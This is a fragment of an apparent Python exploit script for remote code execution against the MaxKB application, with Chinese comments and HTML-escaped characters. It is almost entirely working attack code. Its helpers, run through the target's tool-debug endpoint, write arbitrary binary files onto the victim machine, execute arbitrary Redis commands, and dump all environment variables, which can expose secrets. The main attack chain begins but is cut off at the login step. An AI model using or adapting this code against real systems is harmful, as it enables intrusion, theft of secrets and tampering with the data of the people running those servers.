 ========= 新增：远程写文件功能 =========def write_remote_file(remote_path, b64_content, mode=&quot;wb&quot;): &quot;&quot;&quot; 在目标机器上写二进制文件（从 base64 字符串解码） :param remote_path: 目标文件路径，例如 &#x27;/tmp/pwned.bin&#x27; :param b64_content: base64 编码后的内容（str） :param mode: 文件模式，默认 &#x27;wb&#x27;，可以传 &#x27;ab&#x27; 追加二进制 &quot;&quot;&quot; code = f&quot;&quot;&quot;def write_file(): import base64 path = &#123;remote_path!r&#125; b64_data = &#123;b64_content!r&#125; mode = &#123;mode!r&#125; try: data = base64.b64decode(b64_data) with open(path, mode) as f: f.write(data) return f&quot;OK: wrote &#123;&#123;len(data)&#125;&#125; bytes to &#123;&#123;path&#125;&#125; with mode=&#123;&#123;mode&#125;&#125;&quot; except Exception as e: return f&quot;Error writing to &#123;&#123;path&#125;&#125;: &#123;&#123;e&#125;&#125;&quot; return write_file()&quot;&quot;&quot; return execute_python_code(code)# ======================================def execute_redis_command(host, port, password, command): &quot;&quot;&quot; 在目标机器上执行 Redis 命令 :param host: Redis 服务器地址 :param port: Redis 服务器端口 :param password: Redis 密码，如果没有则为 None :param command: 要执行的 Redis 命令，以字符串形式提供，例如 &quot;KEYS *&quot; 或 &quot;GET mykey&quot; :return: 命令执行结果或错误信息 &quot;&quot;&quot; code = f&quot;&quot;&quot;def redis_cmd_runner(): try: import redis import json except ImportError: return &quot;Error: &#x27;redis&#x27; library not found on the target system.&quot; # 将外部传入的参数赋值给内部变量 redis_host = &#123;host!r&#125; redis_port = &#123;port&#125; redis_password = &#123;password!r&#125; # 如果 password 为 None，!r 会正确处理成 &#x27;None&#x27; command_str = &#123;command!r&#125; try: # 建立 Redis 连接 # decode_responses=False 是默认行为，我们会手动解码，以更好地处理潜在的编码错误 r = redis.Redis(host=redis_host, port=redis_port, password=redis_password, db=0) # 测试连接 r.ping() # 将命令字符串拆分成列表，以便传递给 execute_command command_parts = command_str.split() # 执行命令 raw_result = r.execute_command(*command_parts) # Redis 的返回结果通常是 bytes 或 list of bytes，需要解码 def decode_redis_result(item): if isinstance(item, bytes): return item.decode(&#x27;utf-8&#x27;, &#x27;ignore&#x27;) # 使用 ignore 以免遇到非 utf8 字符时崩溃 elif isinstance(item, list): return [decode_redis_result(i) for i in item] else: return item # 对于数字等类型，直接返回 result = decode_redis_result(raw_result) # 以 JSON 格式返回，统一输出 return json.dumps(result, indent=2, ensure_ascii=False) except Exception as e: return f&quot;Redis Error: &#123;&#123;e&#125;&#125;&quot; return redis_cmd_runner()&quot;&quot;&quot; return execute_python_code(code)def get_environment_variables(): &quot;&quot;&quot; 在目标机器上获取并返回所有环境变量 &quot;&quot;&quot; code = f&quot;&quot;&quot;def dump_env_vars(): import os try: env_data = str(os.environ) path = &quot;/opt/maxkb-app/sandbox/env.txt&quot; with open(path, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f: f.write(env_data) return env_data except Exception as e: return f&quot;Error getting environment variables: &#123;&#123;e&#125;&#125;&quot; return dump_env_vars()&quot;&quot;&quot; return execute_python_code(code)def main(): &quot;&quot;&quot;Main exploitation function&quot;&quot;&quot; print(&quot;=&quot; * 60) print(&quot;MaxKB RCE Exploit - Complete Attack Chain&quot;) print(&quot;=&quot; * 60) print(f&quot;[+] Target: &#123;TARGET_URL&#125;&quot;) print(f&quot;[+] Username: &#123;USERNAME&#125;&quot;) print(f&quot;[+] Exploit endpoint: &#123;TOOL_DEBUG_API&#125;&quot;) # Step 1: Login print(&quot;
